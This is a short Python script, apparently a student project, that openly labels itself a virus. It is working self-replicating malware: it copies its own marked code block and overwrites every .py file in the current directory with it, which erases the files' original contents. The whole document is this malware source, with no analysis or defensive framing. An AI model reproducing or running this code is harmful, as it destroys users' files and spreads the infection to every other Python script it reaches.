#VStart
#!/usr/bin/python3

import sys
import re
import glob
import os

virusCode = []

# open file and read all lines
# filter out lines that aren't in code boundary

thisFile = sys.argv[0]
virusFile = open(thisFile, "r")
lines = virusFile.readlines()
virusFile.close()


inVirus = False  #Initiliaze
for line in lines:
    if (re.search("^#VStart", line)):
        inVirus = True
        # Start appending to the list from the start of the virus 
    
    if (inVirus == True):
        virusCode.append(line)

    if (re.search("^#VEnd", line)): #200004578 indicated end of the project
        break # End


# Find victims to infect with the virus
# glob is used for searching of files
programsToInfect = glob.glob("*.py")

print("LOCATED : ")
print(programsToInfect)

#start infecting
for program in programsToInfect:
    newFile = open(program,"r")
    programLines = newFile.readlines()
    newFile.close()

    #newCodeInfected = programLines
    newCodeInfected = virusCode
    print(" VIRUS INFECTED FILE " + program )

    File = open(program,"w")
    File.writelines(newCodeInfected)
    File.close()

#payload (Problem that virus will cause)
print("FINISHED")

#VEnd